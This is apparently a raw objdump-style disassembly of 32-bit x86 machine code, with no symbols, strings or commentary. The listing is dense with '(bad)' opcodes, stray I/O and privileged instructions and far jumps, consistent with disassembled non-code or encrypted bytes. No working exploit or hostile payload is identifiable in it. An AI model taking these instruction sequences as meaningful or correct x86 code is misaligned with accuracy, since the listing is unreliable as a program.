  422b22:	gs pop esp
  422b24:	add    BYTE PTR [eax-0x54aefef9],ah
  422b2a:	jns    0x422b3f
  422b2c:	lods   eax,DWORD PTR ds:[esi]
  422b2d:	call   0x2276:0x51265f1e
  422b34:	loope  0x422b7f
  422b36:	mov    dh,0x6d
  422b38:	dec    edx
  422b39:	dec    ebx
  422b3a:	je     0x422bae
  422b3c:	xchg   edi,eax
  422b3d:	jns    0x422b64
  422b3f:	ds inc edx
  422b41:	fwait
  422b42:	jnp    0x422b63
  422b44:	inc    ebp
  422b45:	mov    esi,0xbd987403
  422b4a:	cdq    
  422b4b:	mov    eax,ds:0xd579e1a8
  422b50:	(bad)  
  422b51:	cmp    eax,0x1024744f
  422b56:	mov    ds:0x6172a906,al
  422b5b:	les    ebx,FWORD PTR [edi]
  422b5d:	(bad)
  422b60:	jl     0x422af3
  422b62:	rcr    bl,0xdd
  422b65:	adc    DWORD PTR [ebp-0x2f],edi
  422b68:	das    
  422b69:	cmc    
  422b6a:	shr    BYTE PTR [esi],1
  422b6c:	push   ebx
  422b6d:	or     al,0x79
  422b6f:	pop    edx
  422b70:	lods   eax,DWORD PTR ds:[esi]
  422b71:	pop    edx
  422b72:	push   es
  422b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b74:	adc    eax,0x68fc1cd9
  422b79:	add    bh,ah
  422b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b7c:	daa    
  422b7d:	push   esi
  422b7e:	rol    edi,cl
  422b80:	pop    ebp
  422b81:	fwait
  422b82:	and    cl,BYTE PTR [esi]
  422b84:	daa    
  422b85:	cmp    ah,BYTE PTR [eax+0x13]
  422b88:	(bad)  
  422b89:	jge    0x422be2
  422b8b:	push   esp
  422b8c:	mov    dl,0x46
  422b8e:	add    bh,BYTE PTR [ebx+ebp*4+0x768c2ec8]
  422b95:	outs   dx,DWORD PTR ds:[esi]
  422b96:	iret   
  422b97:	mov    ebx,DWORD PTR [ebx+0x319dc135]
  422b9d:	cmp    ah,BYTE PTR [ebp-0x4a23ead7]
  422ba3:	loop   0x422bae
  422ba5:	inc    ebp
  422ba6:	clc    
  422ba7:	test   BYTE PTR [edi+0x4b6a295e],0xae
  422bae:	popa   
  422baf:	sti    
  422bb0:	sbb    al,0x85
  422bb2:	inc    eax
  422bb3:	push   cs
  422bb4:	push   edx
  422bb5:	pop    es
  422bb6:	leave  
  422bb7:	mov    ebx,0x5a08e2b8
  422bbc:	rcr    DWORD PTR [edi+ebp*1],1
  422bbf:	cmp    ch,dl
  422bc1:	jae    0x422bb4
  422bc3:	ins    BYTE PTR es:[edi],dx
  422bc4:	adc    al,0x14
  422bc6:	ret    0xb7b3
  422bc9:	lock adc eax,0x903e5a68
  422bcf:	and    al,0xef
  422bd1:	pop    ss
  422bd2:	cs jle 0x422c0e
  422bd5:	pop    ebp
  422bd6:	mov    esp,0xf3225359
  422bdb:	ja     0x422b8d
  422bdd:	pop    edx
  422bde:	pop    edx
  422bdf:	dec    edx
  422be0:	cld    
  422be1:	adc    eax,0x5fe477d9
  422be6:	test   BYTE PTR [ebp-0x6bdb0b06],bh
  422bec:	push   cs
	...
  422c55:	add    BYTE PTR [edi+esi*1+0x4a],al
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx+0x4ed34d9c]
  422c64:	lods   eax,DWORD PTR ds:[esi]
  422c65:	jmp    0xff:0x174c9
  422c6c:	add    BYTE PTR [eax],al
  422c6e:	cwde   
  422c6f:	mov    ch,0xab
  422c71:	imul   esp,DWORD PTR [edx],0xffffffb1
  422c74:	push   ebx
  422c75:	clc    
  422c76:	pop    ebx
  422c77:	in     eax,0xc8
  422c79:	or     eax,edx
  422c7b:	test   BYTE PTR gs:[edx+esi*1],al
  422c7f:	fs pop ecx
  422c81:	out    0xaa,al
  422c83:	stos   BYTE PTR es:[edi],al
  422c84:	rcl    DWORD PTR [ebx+0x745b0af0],1
  422c8a:	(bad)  
  422c8c:	jl     0x422c44
  422c8e:	xchg   edi,eax
  422c8f:	and    DWORD PTR [ebx+0x20],ebx
  422c92:	dec    ecx
  422c93:	fs iret 
  422c95:	imul   edi,esi,0x0
  422c98:	pop    esi
  422c99:	mov    edi,0x2d58b0fa
  422c9e:	wbinvd 
  422ca0:	div    BYTE PTR [eax+0x5d76ec87]
  422ca6:	retf   
  422ca7:	dec    ebp
  422ca8:	dec    ebp
  422ca9:	and    ebx,ecx
  422cab:	pop    es
  422cac:	out    dx,al
  422cad:	push   ss
  422cae:	cli    
  422caf:	jbe    0x422cf3
  422cb1:	mov    gs,esp
  422cb3:	les    edi,FWORD PTR [esi+0x7f6bbeed]
  422cb9:	inc    ebx
  422cba:	adc    DWORD PTR ds:0x9698db0d,ebp
  422cc0:	fiadd  DWORD PTR [esi]
  422cc2:	or     DWORD PTR [eax-0x47a159af],edi
  422cc8:	pushf  
  422cc9:	loop   0x422cd5
  422ccb:	out    0x3e,eax
  422ccd:	mov    bl,0x3a
  422ccf:	mov    WORD PTR [ebx],ss
  422cd1:	lahf   
  422cd2:	repnz outs dx,BYTE PTR ds:[esi]
  422cd4:	cmp    al,0x11
  422cd6:	imul   esp,DWORD PTR [eax+ebx*4-0x4cb2aa01],0x43504d49
  422ce1:	inc    ebx
  422ce2:	and    DWORD PTR [esi+edx*2+0x3a8a5b5],ebx
  422ce9:	dec    edi
  422cea:	clc    
  422ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cec:	add    al,bl
  422cee:	mov    edx,0x841e95bf
  422cf3:	xchg   esi,eax
  422cf4:	aas    
  422cf5:	mov    ebx,0x1f5e57f4
  422cfa:	sub    edx,esi
  422cfc:	xor    bh,ch
  422cfe:	out    dx,al
  422cff:	push   0x29
  422d01:	(bad)  
  422d02:	in     al,dx
  422d03:	and    BYTE PTR [ecx],ch
  422d05:	rol    esi,cl
  422d07:	xchg   edi,eax
  422d08:	cmp    bl,BYTE PTR [edx]
  422d0a:	mov    ebp,0x9b1047ea
  422d0f:	mov    bh,0xd2
  422d11:	outs   dx,DWORD PTR ds:[esi]
  422d12:	xor    BYTE PTR [eax-0x1d],0xf
  422d16:	mov    edx,ebx
  422d18:	fcomp  QWORD PTR [ebx+eax*8-0x5cc73e45]
  422d1f:	(bad)  
  422d20:	imul   ecx,DWORD PTR [ebx],0x2bffe892
  422d26:	fsubr  st,st(2)
  422d28:	mov    WORD PTR [edi+0x48],?
  422d2b:	add    al,0xa7
  422d2d:	mov    dl,0xc5
  422d2f:	fidivr WORD PTR [ecx]
  422d31:	push   0xffffffe9
  422d33:	fcmovb st,st(3)
  422d35:	dec    eax
  422d36:	jmp    0x29b19c9a
  422d3b:	or     eax,0x5554d9d7
  422d40:	xchg   ecx,eax
  422d41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d42:	mov    dh,0x49
  422d44:	aad    0x29
  422d46:	ret    
  422d47:	aas    
  422d48:	or     eax,0xf529914f
  422d4d:	js     0x422dc6
  422d4f:	xchg   DWORD PTR [eax],ebp
  422d51:	cs int 0xfe
  422d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d55:	lahf   
  422d56:	inc    esi
  422d57:	stos   DWORD PTR es:[edi],eax
  422d58:	ins    BYTE PTR es:[edi],dx
  422d59:	cmpps  xmm5,XMMWORD PTR [ebp+0x27fd906],0xc1
  422d61:	fadd   QWORD PTR ds:0x32211dc1
  422d67:	pop    ss
  422d68:	jno    0x422d57
  422d6a:	and    cl,BYTE PTR [ebx+0x26]
	...
  422dd4:	add    BYTE PTR [eax],al
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ecx,DWORD PTR [esi]
  422de3:	test   DWORD PTR [esi+0x175c89e],eax
  422de9:	add    bh,bh
  422deb:	add    BYTE PTR [eax],al
  422ded:	add    BYTE PTR [ebp+0x15eeb1cc],ch
  422df3:	ret    
  422df4:	jne    0x422d88
  422df6:	in     al,0x1
  422df8:	xor    eax,DWORD PTR [ebx+eax*8]
  422dfb:	nop
  422dfc:	lock mov eax,0xaf7006a2
  422e02:	shl    BYTE PTR [edx],0xb0
  422e05:	inc    ebx
  422e06:	in     eax,0xe0
  422e08:	jno    0x422d96
  422e0a:	push   cs
  422e0b:	pusha  
  422e0c:	mov    edx,0xe36776e
  422e11:	push   edi
  422e12:	gs dec bp
  422e15:	mov    dh,0xa8
  422e17:	mov    bh,BYTE PTR [esi+0x34d15e7a]
  422e1d:	xor    eax,0xba6fb983
  422e22:	repnz loope 0x422e96
  422e25:	(bad)  
  422e26:	in     eax,dx
  422e27:	jecxz  0x422e3c
  422e29:	xchg   esi,eax
  422e2a:	mov    bh,cl
  422e2c:	xor    ecx,DWORD PTR [ecx+0x27]
  422e2f:	pop    esp
  422e30:	and    esi,ebx
  422e32:	mov    ds:0x6fa14c1b,eax
  422e37:	cmp    BYTE PTR [eax-0x4f8a196f],cl
  422e3d:	mov    al,0x39
  422e3f:	popf   
  422e40:	pop    esi
  422e41:	(bad)  
  422e42:	(bad)  
  422e43:	cwde   
  422e44:	fstp   DWORD PTR [ebp+0x4f5a7846]
  422e4a:	push   ds
  422e4b:	mov    edi,0xc9c7a482
  422e50:	jno    0x422e41
  422e52:	pop    edi
  422e53:	adc    DWORD PTR [eax+0x31ef64aa],0xb44251b5
  422e5d:	add    bh,BYTE PTR [edi+eiz*4+0x588a2455]
  422e64:	ficom  DWORD PTR [esi+ebp*8+0x4b]
  422e68:	out    0xf6,eax
  422e6a:	pop    es
  422e6b:	xor    bl,BYTE PTR [ebx-0x7314c4bd]
  422e71:	mov    ch,0xbc
  422e73:	push   0x40
  422e75:	jno    0x422e8f
  422e77:	out    dx,eax
  422e78:	pop    esi
  422e79:	sub    ebx,eax
  422e7b:	add    DWORD PTR [ebp-0xe],edx
  422e7e:	inc    ebp
  422e7f:	sar    BYTE PTR [eax],1
  422e81:	adc    BYTE PTR [ecx],ah
  422e83:	jne    0x422ece
  422e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e86:	pop    eax
  422e87:	pop    ebp
  422e88:	cld    
  422e89:	and    eax,0xdaffed02
  422e8e:	or     dh,BYTE PTR [ecx]
  422e90:	cmc    
  422e91:	sahf   
  422e92:	into   
  422e93:	aas    
  422e94:	pminsw mm1,QWORD PTR [eax+0x20705739]
  422e9b:	add    ch,bh
  422e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e9e:	jbe    0x422e31
  422ea0:	pop    ecx
  422ea1:	mov    dl,0x25
  422ea3:	fsub   DWORD PTR [ebx+esi*8]
  422ea6:	push   ds
  422ea7:	push   ss
  422ea8:	xchg   DWORD PTR [esp+ebx*8],eax
  422eab:	(bad)  
  422ead:	sti    
  422eae:	sub    DWORD PTR [ebp+0x587376a9],esi
  422eb4:	test   DWORD PTR [edx],0x422a1a8a
  422eba:	imul   ebp,DWORD PTR [esi],0xc5caa02e
  422ec0:	fstp   TBYTE PTR [edx-0x33]
  422ec3:	repz div BYTE PTR [ecx]
  422ec6:	(bad)  
  422ec7:	sub    esi,DWORD PTR [edi-0xd]
  422eca:	mov    al,0x2c
  422ecc:	leave  
  422ecd:	retf   
  422ece:	int    0x84
  422ed0:	add    DWORD PTR [edi-0x227f5e05],ecx
  422ed6:	sub    DWORD PTR [ebx],edi
  422ed8:	xor    BYTE PTR [esi+0x78e779a4],al
  422ede:	sbb    al,al
  422ee0:	sbb    eax,0x567472a5
  422ee5:	inc    edx
  422ee6:	pop    ss
  422ee7:	inc    ebp
  422ee8:	push   0xffffff82
  422eea:	(bad)  
  422eeb:	cmp    BYTE PTR [esi+0x0],bl
	...
  422f56:	adc    DWORD PTR [ebp-0x78],0x19
  422f5a:	(bad)  
  422f5c:	xchg   ebx,eax
  422f5d:	fisttp WORD PTR [eax]
  422f5f:	mov    eax,0xa611ca33
  422f64:	push   ebp
  422f65:	push   0xffffffc7
  422f67:	jbe    0x422f6a
  422f69:	add    bh,bh
  422f6b:	add    BYTE PTR [eax],al
  422f6d:	add    cl,ah
  422f6f:	cwde   
  422f70:	stos   BYTE PTR es:[edi],al
  422f71:	in     al,0x4f
  422f73:	mov    bl,0x61
  422f75:	pushf  
  422f76:	sub    eax,0x5d5f1d6d
  422f7b:	je     0x422f06
  422f7d:	mov    DWORD PTR [ebp+0x54ee5980],0x43e6b0f9
  422f87:	ins    BYTE PTR es:[edi],dx
  422f88:	xchg   edx,eax
  422f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f8a:	mov    eax,0xd04fbdd5
  422f8f:	(bad)  [ecx+0x62e76716]
  422f95:	leave  
  422f96:	mov    cl,0x6f
  422f98:	test   ch,ah
  422f9a:	push   ds
  422f9b:	gs mov bh,dl
  422f9e:	mov    eax,0x65ee4945
  422fa3:	rol    DWORD PTR [edi-0x7e],cl
  422fa6:	out    dx,al
  422fa7:	xor    DWORD PTR ds:[esi+0x5c55b97],0x31015e77
  422fb2:	or     al,0xa3
  422fb4:	lods   al,BYTE PTR ds:[esi]
  422fb5:	adc    BYTE PTR [ebx-0x2c70e2a6],bl
  422fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fbc:	ja     0x422fb6
  422fbe:	sub    bh,BYTE PTR [edx-0x48]
  422fc1:	mov    ecx,DWORD PTR [ebx*2-0x41e61625]
  422fc8:	dec    ebp
  422fc9:	into   
  422fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fcb:	or     ebx,DWORD PTR [ebx]
  422fcd:	push   es
  422fce:	mul    DWORD PTR [eax+0x7]
  422fd1:	mov    al,bl
  422fd3:	pusha  
  422fd4:	xor    al,0x54
  422fd6:	int    0x30
  422fd8:	and    bh,bh
  422fda:	clc    
  422fdb:	rcl    DWORD PTR [edx+0xf68c4fc],0xad
  422fe2:	rol    eax,cl
  422fe4:	xchg   ebx,eax
  422fe5:	into   
  422fe6:	imul   eax,DWORD PTR [ebx+eax*4-0x1edf8f4e],0x2d414f0
  422ff1:	int3   
  422ff2:	jne    0x423050
  422ff4:	cmp    ebx,DWORD PTR [ecx]
  422ff6:	pop    esi
  422ff7:	push   es
  422ff8:	or     edi,DWORD PTR [ebx-0x3e]
  422ffb:	outs   dx,BYTE PTR ds:[esi]
  422ffc:	out    0xb8,eax
  422ffe:	or     BYTE PTR [ebx-0x3f],dl
  423001:	xchg   ecx,eax
  423002:	sub    eax,0xb7d2a5a0
  423007:	adc    bh,dh
  423009:	xchg   esp,eax
  42300a:	in     eax,dx
  42300b:	(bad)  
  42300e:	jo     0x42303a
  423010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423011:	jbe    0x42307e
  423013:	mov    ah,0x35
  423015:	xchg   BYTE PTR [edi],al
  423017:	sbb    esp,DWORD PTR ds:0xff60e397
  42301d:	shl    BYTE PTR [ecx-0x10661035],0xd9
  423024:	js     0x423054
  423026:	pop    es
  423027:	pop    ds
  423028:	mov    ds:0x820d110d,eax
  42302d:	ins    BYTE PTR es:[edi],dx
  42302e:	jge    0x423019
  423030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423031:	in     al,dx
  423032:	rol    bh,0x71
  423035:	and    ah,BYTE PTR [esi-0x66f2ae3d]
  42303b:	mov    ebp,DWORD PTR [ebx+0x3b]
  42303e:	gs stos BYTE PTR es:[edi],al
  423040:	out    0x93,eax
  423042:	sbb    al,0x3e
  423044:	or     BYTE PTR [edi],dh
  423046:	cmp    al,0x30
  423048:	mov    eax,ds:0x7e153793
  42304d:	inc    ebx
  42304e:	xchg   DWORD PTR [edi+0x1b],eax
  423051:	cdq    
  423052:	sbb    eax,0x447ff832
  423057:	fisub  WORD PTR [ebx-0xe8fc231]
  42305d:	imul   esi,DWORD PTR [ebp+0x2a],0xffffffca
  423061:	pop    ss
  423062:	inc    esi
  423063:	fdivrp st(4),st
  423065:	enter  0xd4d5,0x6d
  423069:	sbb    dh,bh
  42306b:	retf   
  42306c:	std    
	...
  4230d5:	add    BYTE PTR [esi-0x1c],al
  4230d8:	bound  ecx,QWORD PTR [eax-0x1111711e]
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [edi+ebp*1-0x39e079d9],esp
  4230e7:	ja     0x4230ea
  4230e9:	add    bh,bh
  4230eb:	add    BYTE PTR [eax],al
  4230ed:	add    BYTE PTR [esi-0x46ce7ae6],bh
  4230f3:	ins    DWORD PTR es:[edi],dx
  4230f4:	daa    
  4230f5:	xor    eax,0x41a20a63
  4230fa:	leave  
  4230fb:	scas   eax,DWORD PTR es:[edi]
  4230fc:	push   ebp
  4230fd:	out    0x30,eax
  4230ff:	outs   dx,BYTE PTR ds:[esi]
  423100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423101:	xor    BYTE PTR [eax-0x478cafba],bh
  423107:	push   ecx
  423108:	adc    BYTE PTR [edx],dh
  42310a:	(bad)  
  42310b:	sbb    ebp,DWORD PTR [edi+0x5f]
  42310e:	mov    ah,0x78
  423110:	cmp    BYTE PTR [edi-0x5b4d7557],ah
  423116:	ins    DWORD PTR es:[edi],dx
  423117:	outs   dx,DWORD PTR ds:[esi]
  423118:	add    BYTE PTR [edx+0x34],bl
  42311b:	xchg   ebp,eax
  42311c:	jl     0x423121
  42311e:	and    DWORD PTR [eax+ebp*1],esp
  423121:	aam    0xef
  423123:	outs   dx,DWORD PTR ds:[esi]
  423124:	call   0x64b1:0x4f65d48b
  42312b:	out    dx,al
  42312c:	rcl    BYTE PTR ds:[ecx-0x6f36e17f],cl
  423133:	inc    esi
  423134:	sub    ah,0x3a
  423137:	test   eax,0x28b2917d
  42313c:	sub    eax,0xf3350e13
  423141:	cmp    al,0x33
  423143:	sti    
  423144:	mov    edi,0x3b6992e5
  423149:	mov    BYTE PTR [ecx],bh
  42314b:	aaa    
  42314c:	test   al,0x28
  42314e:	mov    al,ds:0xfe7abe44
  423153:	out    0xda,eax
  423155:	push   ds
  423156:	mov    al,ds:0x999f8ecc
  42315b:	jnp    0x423154
  42315d:	and    al,0x18
  42315f:	ror    ebp,0x61
  423162:	adc    bl,BYTE PTR [ebx+0x24531719]
  423168:	cwde   
  423169:	cmp    BYTE PTR [ebp-0x7],0xf7
  42316d:	inc    ebp
  42316e:	(bad)  
  42316f:	retf   
  423170:	je     0x4231c7
  423172:	jp     0x4231b3
  423174:	ds retf 
  423176:	test   DWORD PTR [eax-0x51],ecx
  423179:	fmul   QWORD PTR [esi]
  42317b:	inc    ebx
  42317c:	push   ss
  42317d:	add    ecx,esi
  42317f:	and    eax,DWORD PTR [eax]
  423181:	in     eax,0xbb
  423183:	dec    eax
  423184:	push   es
  423185:	pop    ebp
  423186:	mov    esp,0x275811d7
  42318b:	mov    dh,0x23
  42318d:	push   cs
  42318e:	stos   DWORD PTR es:[edi],eax
  42318f:	enter  0x86e0,0xd4
  423193:	loopne 0x4231d3
  423195:	sbb    al,0x32
  423197:	add    esp,ebp
  423199:	push   edx
  42319a:	mov    bh,0x89
  42319c:	pop    ebx
  42319d:	aad    0x1
  42319f:	mov    ah,0x51
  4231a1:	xchg   esp,eax
  4231a2:	(bad)  
  4231a3:	int3   
  4231a4:	or     DWORD PTR [esi],ecx
  4231a6:	int3   
  4231a7:	pop    ecx
  4231a8:	retf   
  4231a9:	int    0xce
  4231ab:	add    al,0x5d
  4231ad:	xchg   DWORD PTR [edx-0x5c],edi
  4231b0:	add    dh,BYTE PTR [esi+ecx*1+0x28fb6db]
  4231b7:	push   ebx
  4231b8:	cmp    BYTE PTR [esi+edi*1],dl
  4231bb:	fidiv  WORD PTR [edi-0x47]
  4231be:	(bad)  [esp+esi*1-0x30]
  4231c2:	push   es
  4231c3:	sar    DWORD PTR [ebx-0x72cf1146],cl
  4231c9:	sti    
  4231ca:	or     eax,DWORD PTR [esi+0x2b5d2639]
  4231d0:	push   ds
  4231d1:	(bad)  
  4231d2:	sbb    eax,0xa59a651e
  4231d7:	and    BYTE PTR [edx+0x18],ch
  4231da:	ins    BYTE PTR es:[edi],dx
  4231db:	mov    DWORD PTR [ebp-0x19],esp
  4231de:	hlt    
  4231df:	inc    ecx
  4231e0:	sub    al,0xb3
  4231e2:	leave  
  4231e3:	rol    DWORD PTR [esi-0x798484d2],cl
  4231e9:	pop    ecx
  4231ea:	pop    eax
  4231eb:	mov    al,ds:0x5e
	...
  423254:	add    BYTE PTR [eax],al
  423256:	jns    0x423249
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx-0x7e4e1a98],esp
  423266:	lds    edi,FWORD PTR [eax+0x1]
  423269:	add    bh,bh
  42326b:	add    BYTE PTR [eax],al
  42326d:	add    BYTE PTR [ecx+ecx*2-0x5234fd19],dl
  423274:	cmp    DWORD PTR [ebx+0x7b],edx
  423277:	inc    ecx
  423278:	in     al,dx
  423279:	stos   BYTE PTR es:[edi],al
  42327a:	xor    al,0xd0
  42327c:	xchg   ebx,eax
  42327d:	mov    bl,BYTE PTR [esi]
  42327f:	mov    edi,0x4c8bb320
  423284:	pop    ebx
  423285:	in     eax,0xa5
  423287:	and    DWORD PTR [edi+0x351912bc],edi
  42328d:	stos   DWORD PTR es:[edi],eax
  42328e:	aaa    
  42328f:	mov    edx,DWORD PTR [edi]
  423291:	out    0x3d,al
  423293:	add    bh,BYTE PTR [ebx+edx*8+0x70d17c0e]
  42329a:	enter  0x9fde,0x48
  42329e:	sub    eax,0x8a4df9f9
  4232a3:	(bad)  [ecx-0x2]
  4232a6:	das    
  4232a7:	stos   DWORD PTR es:[edi],eax
  4232a8:	pop    esp
  4232a9:	xor    al,0xd1
  4232ab:	push   dx
  4232ad:	and    BYTE PTR [ebp+0x37],0xba
  4232b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232b2:	pusha  
  4232b3:	cmp    BYTE PTR [ecx+0xc],dh
  4232b6:	hlt    
  4232b7:	stos   DWORD PTR es:[edi],eax
  4232b8:	push   eax
  4232b9:	enter  0x3eea,0x9e
  4232bd:	cmp    DWORD PTR [edi+0x19],edi
  4232c0:	pop    edi
  4232c1:	addr16 mov dl,0xfd
  4232c4:	jge    0x42327b
  4232c6:	sub    al,0xd2
  4232c8:	push   0x38
  4232ca:	sub    al,0xf0
  4232cc:	in     eax,dx
  4232cd:	cld    
  4232ce:	fcom   QWORD PTR [edi+0x58]
  4232d1:	enter  0x7f02,0x84
  4232d5:	xor    eax,DWORD PTR [eax+0x580fc81d]
  4232db:	rcr    DWORD PTR [edx-0x245868b8],0xa9
  4232e2:	lds    eax,FWORD PTR [ebp-0x67]
  4232e5:	iret   
  4232e6:	outs   dx,DWORD PTR ds:[esi]
  4232e7:	dec    ebx
  4232e8:	ficom  WORD PTR [eax+0x2a1e195d]
  4232ee:	sbb    ebx,DWORD PTR [edi+0x464b702d]
  4232f4:	pop    eax
  4232f5:	add    BYTE PTR [edx-0x71],ch
  4232f8:	and    al,0x9
  4232fa:	lds    ebp,FWORD PTR [edi-0x2f]
  4232fd:	sbb    eax,0xe4bff6de
  423302:	mov    esp,0xc76f1be8
  423307:	mov    ds:0x8ac6cc7a,al
  42330c:	and    eax,0x921485c0
  423311:	out    dx,eax
  423312:	test   eax,0xbc5c4baf
  423317:	test   BYTE PTR [edi-0x30],al
  42331a:	cmp    edi,DWORD PTR [edi-0x23ee6b2f]
  423320:	ins    DWORD PTR es:[edi],dx
  423321:	loope  0x4232e4
  423323:	test   DWORD PTR [esp+edx*8],ebp
  423326:	cmp    eax,0x6ed803c9
  42332b:	jo     0x4233a0
  42332d:	inc    esp
  42332e:	dec    esp
  42332f:	sub    dl,BYTE PTR [esi+0x7a]
  423332:	sar    DWORD PTR [esi],cl
  423334:	push   eax
  423335:	shr    edx,0x7b
  423338:	nop
  423339:	test   al,0x98
  42333b:	adc    eax,0x97002369
  423340:	adc    BYTE PTR [ecx-0x57],dh
  423343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423344:	fld    QWORD PTR [esi-0x66]
  423347:	mov    esp,esi
  423349:	stc    
  42334a:	stc    
  42334b:	adc    eax,0x2de1e5b
  423350:	fs retf 0x48
  423354:	push   0xffffff83
  423356:	fwait
  423357:	dec    edx
  423358:	outs   dx,DWORD PTR ds:[esi]
  423359:	dec    edi
  42335a:	and    ebp,edx
  42335c:	mov    edi,0x61ea564a
  423361:	lock adc eax,0xd7a53b33
  423367:	xchg   esi,eax
  423368:	cmp    eax,0xa5bf2bdd
	...
  4233d5:	add    al,bh
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0x26360f44
  4233e4:	inc    ebp
  4233e5:	aam    0xc4
  4233e7:	jns    0x4233ea
  4233e9:	add    bh,bh
  4233eb:	add    BYTE PTR [eax],al
  4233ed:	add    BYTE PTR [esi],dl
  4233ef:	dec    edi
  4233f0:	push   ebp
  4233f1:	ja     0x423432
  4233f3:	sbb    BYTE PTR [ebx-0x31e56b88],ah
  4233f9:	mov    eax,ds:0x2e942e8
  4233fe:	cmp    DWORD PTR [edi],edx
  423400:	push   ebp
  423401:	add    eax,0x5ebea10
  423406:	dec    esi
  423407:	icebp  
  423408:	icebp  
  423409:	inc    esi
  42340a:	sbb    dh,BYTE PTR [edx]
  42340c:	out    0x54,al
  42340e:	scas   al,BYTE PTR es:[edi]
  42340f:	push   ds
  423410:	(bad)  
  423411:	stc    
  423412:	stos   BYTE PTR es:[edi],al
  423413:	dec    eax
  423414:	xchg   esp,eax
  423415:	push   ebp
  423416:	jbe    0x4233c1
  423418:	not    edx
  42341a:	pusha  
  42341b:	sbb    dl,cl
  42341d:	std    
  42341e:	fld    QWORD PTR [ebx-0x286e8ca0]
  423424:	dec    ebx
  423425:	xor    DWORD PTR [ecx+0xd],0xfffffff2
  423429:	cld    
  42342a:	std    
  42342b:	jno    0x423480
  42342d:	dec    edx
  42342e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42342f:	(bad)  
  423431:	sub    ah,BYTE PTR [eax-0x7a4ad2c7]
  423437:	dec    esp
  423438:	enter  0xef71,0x91
  42343c:	scas   al,BYTE PTR es:[edi]
  42343d:	jg     0x423425
  42343f:	adc    eax,0x1b2817f4
  423444:	xor    al,0xa0
  423446:	pop    eax
  423447:	xor    eax,esi
  423449:	arpl   WORD PTR [edx-0x2c],dx
  42344c:	nop
  42344d:	mov    ch,0x2e
  42344f:	adc    esi,ecx
  423451:	dec    edi
  423452:	sbb    eax,0x46ed03b2
  423457:	fwait
  423458:	mov    esi,0xa7ca1e82
  42345d:	sti    
  42345e:	sub    al,BYTE PTR ds:0xa9319512
  423464:	jmp    FWORD PTR [edi+ebp*1+0x7e]
  423468:	sti    
  423469:	int3   
  42346a:	xchg   DWORD PTR [ebx+0x70ec456f],ecx
  423470:	imul   esi,DWORD PTR [edi-0x78bcc7b],0x4f
  423477:	dec    edi
  423478:	mov    edi,0x890710a7
  42347d:	sub    al,BYTE PTR [ecx+0x13]
  423480:	mov    al,0x53
  423482:	cmp    DWORD PTR [ecx+0x3f11d502],edx
  423488:	dec    edi
  423489:	pop    edx
  42348a:	data16 (bad) 
  42348c:	in     eax,0x4a
  42348e:	jnp    0x4234ad
  423490:	cmp    eax,0x3403a520
  423495:	out    0x9f,eax
  423497:	adc    al,0x86
  423499:	jle    0x4234d7
  42349b:	pusha  
  42349c:	push   esi
  42349d:	pop    ebp
  42349e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42349f:	fstp   QWORD PTR [ebx]
  4234a1:	in     eax,0x1
  4234a3:	outs   dx,BYTE PTR ds:[esi]
  4234a4:	clc    
  4234a5:	jae    0x4234da
  4234a7:	mov    ecx,0xe3717ee9
  4234ac:	xor    al,0xce
  4234ae:	push   edx
  4234af:	push   edx
  4234b0:	sub    esp,DWORD PTR [esi]
  4234b2:	clc    
  4234b3:	jo     0x4234f8
  4234b5:	mov    BYTE PTR [ebx-0x1108b902],al
  4234bb:	lds    edx,FWORD PTR [edx-0x80]
  4234be:	call   0x3ce8015e
  4234c3:	int3   
  4234c4:	pop    esi
  4234c5:	jmp    0x64d6:0x7f699d18
  4234cc:	add    DWORD PTR [ecx*1+0x12add4b5],ecx
  4234d3:	sbb    BYTE PTR [ecx],cl
  4234d5:	jge    0x42354f
  4234d7:	add    ecx,DWORD PTR [eax-0x50]
  4234da:	or     BYTE PTR [edx-0x6e],ah
  4234dd:	in     eax,0xc4
  4234df:	idiv   BYTE PTR [ecx]
  4234e1:	shl    BYTE PTR [eax+0x461c8592],cl
  4234e7:	in     eax,0x58
  4234e9:	xchg   ecx,eax
  4234ea:	cmc    
  4234eb:	fcmovbe st,st(0)
	...
  423555:	add    al,al
  423557:	mov    al,0x45
  423559:	outs   dx,DWORD PTR ds:[esi]
  42355a:	jne    0x42355b
  42355c:	jmp    0xea1f:0xadf467bf
  423563:	add    bh,BYTE PTR [eax+0x17ac3c6]
  423569:	add    bh,bh
  42356b:	add    BYTE PTR [eax],al
  42356d:	add    BYTE PTR [ebx],bh
  42356f:	(bad)  
  423570:	lea    edx,ss:0xa645b767
  423577:	mov    es,edi
  423579:	sahf   
  42357a:	xor    ecx,ecx
  42357c:	and    ch,ah
  42357e:	aaa    
  42357f:	inc    ecx
  423580:	mov    DWORD PTR [ebx-0x36a11cb1],esp
  423586:	or     eax,0x13426d9
  42358b:	xor    bl,bl
  42358d:	pop    es
  42358e:	jne    0x423606
  423590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423591:	push   ebp
  423592:	arpl   bx,ax
